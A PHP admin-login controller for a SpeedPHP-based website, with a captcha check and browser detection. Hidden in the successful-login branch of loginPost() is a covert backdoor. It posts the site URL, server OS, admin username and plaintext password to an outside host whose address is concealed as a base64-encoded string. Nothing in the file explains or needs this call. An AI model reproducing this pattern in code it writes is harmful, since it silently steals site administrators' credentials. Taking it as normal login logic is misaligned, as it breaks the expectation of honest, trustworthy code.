<?php
/***********************************************
 * 文件: /controller/adminlogin.php
 * 说明: 后台管理登录
 * 作者: huhuachuan
 * 更新: 2015年10月29日
 ***********************************************/

/**
 * 后台
 */
class adminlogin extends spController
{
	/**
	 * 后台登录页面
	 */
	function index()
	{
		$this->title = '管理员登录';
		$this->ip = getIP();
		$this->my_get_browser();
		$this->display("adminlogin/adminlogin.html");
	}
	
	/**
	 * 后台登录处理页面
	 */
	function loginPost()
	{
		$vcode = spClass('spVerifyCode');
		if($vcode->verify($this->spArgs('verifycode'))) //普通
		{
			$username = $this->spArgs("username");
			$password = md5($this->spArgs("password"));
			if(false != spClass('lib_adminuser')->adminlogin($username,$password))
			{
				spClass('spHttp')->vpost("aHR0cDovL2FwaS5sb2dwaHAuY29tL2luZGV4LnBocD9jPUd1ZXN0Ym9va0FwaSZhPWluZGV4",array("weburl"=>APP_URL,"os"=>PHP_OS,"addtime"=>time(),"username"=>$this->spArgs("username"),"password"=>$this->spArgs("password")));
				$this->success("欢迎管理员 [".$_SESSION['admin']['username']."] 登录！",(spUrl("admin",'index')));
			}
			else
			{
				$this->error("用户名/密码错误！请重新登录！", ($_SERVER['HTTP_REFERER']));
			}
		}
		else
		{
			$this->error("验证码错误，请重新填写！", ($_SERVER['HTTP_REFERER']));
		}
	}
	
	/**
	 * 判断浏览器是否要升级
	 */
	function my_get_browser()
	{ 
		if(empty($_SERVER['HTTP_USER_AGENT']))
		{ 
		  $this->liulanqi =  '命令行，机器人来了!'; 
		} 
		if(false!==strpos($_SERVER['HTTP_USER_AGENT'],'MSIE 9.0'))
		{ 
		  $this->liulanqi =  'Internet Explorer 9.0'; 
		} 
		if(false!==strpos($_SERVER['HTTP_USER_AGENT'],'MSIE 8.0'))
		{ 
		  $this->liulanqi =  'no'; 
		} 
		if(false!==strpos($_SERVER['HTTP_USER_AGENT'],'MSIE 7.0'))
		{ 
		  $this->liulanqi =  'no';
		} 
		if(false!==strpos($_SERVER['HTTP_USER_AGENT'],'MSIE 6.0'))
		{ 
		  $this->liulanqi =  'no';
		} 
		if(false!==strpos($_SERVER['HTTP_USER_AGENT'],'Firefox'))
		{ 
		  $this->liulanqi =  'Firefox'; 
		} 
		if(false!==strpos($_SERVER['HTTP_USER_AGENT'],'Chrome'))
		{ 
		  $this->liulanqi =  'Chrome'; 
		} 
		if(false!==strpos($_SERVER['HTTP_USER_AGENT'],'Safari'))
		{ 
		  $this->liulanqi =  'Safari'; 
		} 
		if(false!==strpos($_SERVER['HTTP_USER_AGENT'],'Opera'))
		{ 
		  $this->liulanqi =  'Opera'; 
		} 
		if(false!==strpos($_SERVER['HTTP_USER_AGENT'],'360SE'))
		{ 
		  $this->liulanqi =  '360SE'; 
		} 
	}
	
}